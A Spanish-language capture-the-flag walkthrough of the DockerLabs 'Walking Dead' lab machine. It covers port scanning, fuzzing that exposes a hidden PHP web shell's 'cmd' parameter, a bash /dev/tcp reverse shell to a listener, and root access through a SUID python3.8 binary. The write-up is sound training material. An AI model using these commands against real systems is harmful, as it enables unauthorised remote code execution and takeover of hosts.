---
icon: flag
---

# Walking Dead DockerLabs (Easy)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip walking_dead.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh walking_dead.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 11:14 EST
Nmap scan report for 172.17.0.2
Host is up (0.000034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0d:09:9d:0f:dc:43:54:cd:39:a9:e2:d6:81:74:40:e8 (RSA)
|   256 09:d0:f6:52:00:3f:21:51:19:b1:c6:7a:f4:ff:21:01 (ECDSA)
|_  256 19:e0:b3:72:bd:e9:1e:8d:4c:c4:fd:1f:da:3f:a5:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Walking Dead - CTF
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

Si vamos a la pagina web e inspeccionamos el codigo, vemos lo siguiente bastante interesante:

```html
<p class="hidden-link"><a href="hidden/.shell.php">Access Panel</a></p>
```

Vemos que hay una carpeta llamada `hidden` junto con un archivo oculto que parece ser una `shell` en `PHP`, si nos metemos a dicho archivo veremos todo en blanco, lo que quiere decir que todo esta en `PHP` y no hay nada que a nivel usuario se pueda ver.

Si realizamos un poco de `fuzzing` encontramos lo siguiente:

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/backup.txt           (Status: 200) [Size: 53]
/hidden               (Status: 301) [Size: 309] [--> http://172.17.0.2/hidden/]
/index.html           (Status: 200) [Size: 1380]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
```

Vemos varias cosas interesantes, si vamos al `/backup.txt` veremos el siguiente texto:

```
Error 403: Forbidden. Directory listing is disabled.
```

Que no nos dice mucho, pero si recordamos tenemos una extension `.php` en el archivo `.shell.php` por lo que vamos a probar a ver si tuviera algun parametro vulnerable en el que se pueda hacer injeccion de codigo:

## FFUF

```shell
ffuf -u http://<IP>/hidden/.shell.php\?FUZZ\=whoami -w <WORDLIST> -fs 0
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/hidden/.shell.php?FUZZ=whoami
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

cmd                     [Status: 200, Size: 9, Words: 1, Lines: 2, Duration: 4ms]
:: Progress: [20469/20469] :: Job [1/1] :: 99 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

Vemos que en el parametro llamado `cmd` podemos realizar ejecuccion de comandos, por lo que haremos lo siguiente:

```
URL = http://<IP>/hidden/.shell.php?cmd=whoami
```

Info:

```
www-data
```

Ahora vamos ha realizar una `reverse shell` de la siguiente forma, nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y ahora en la `URL` pondremos lo siguiente:

```
URL = http://<IP>/hidden/.shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/<IP>/<PORT> 0>%261'
```

Enviamos esto y si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 34630
bash: cannot set terminal process group (23): Inappropriate ioctl for device
bash: no job control in this shell
www-data@1d3cc124941a:/var/www/html/hidden$ whoami
whoami
www-data
```

Por lo que vemos seremos el usuario `www-data`, tendremos que sanitizar la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si listamos los permisos `SUID` que tenemos veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
2109471    468 -rwsr-xr-x   1 root     root       477672 Jan  2  2024 /usr/lib/openssh/ssh-keysign
  2109456     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  2104556     52 -rwsr-xr-x   1 root     root          53040 Feb  6  2024 /usr/bin/chsh
  2104685     44 -rwsr-xr-x   1 root     root          44784 Feb  6  2024 /usr/bin/newgrp
  2104696     68 -rwsr-xr-x   1 root     root          68208 Feb  6  2024 /usr/bin/passwd
  2104759     68 -rwsr-xr-x   1 root     root          67816 Apr  9  2024 /usr/bin/su
  2104621     88 -rwsr-xr-x   1 root     root          88464 Feb  6  2024 /usr/bin/gpasswd
  2104680     56 -rwsr-xr-x   1 root     root          55528 Apr  9  2024 /usr/bin/mount
  2126697      4 -rwsr-xr-x   1 root     root            320 Oct 11 04:09 /usr/bin/man
  2104784     40 -rwsr-xr-x   1 root     root          39144 Apr  9  2024 /usr/bin/umount
  2104550     84 -rwsr-xr-x   1 root     root          85064 Feb  6  2024 /usr/bin/chfn
  2126698   5360 -rwsr-xr-x   1 root     root        5486392 Jan 17 15:40 /usr/bin/python3.8
  2109258    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo
```

Vemos unos permisos `SUID` bastante interesantes, que sera el siguiente:

```
2126698   5360 -rwsr-xr-x   1 root  root  5486392 Jan 17 15:40 /usr/bin/python3.8
```

Por lo que vemos podremos ejecutar `python3.8` como el usuario `root` ya que podemos ejecutarlo en su nombre.

```shell
python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

Info:

```
bash-5.0# whoami
root
```

Y con esto ya seremos `root`, por lo que habremos terminado la maquina.
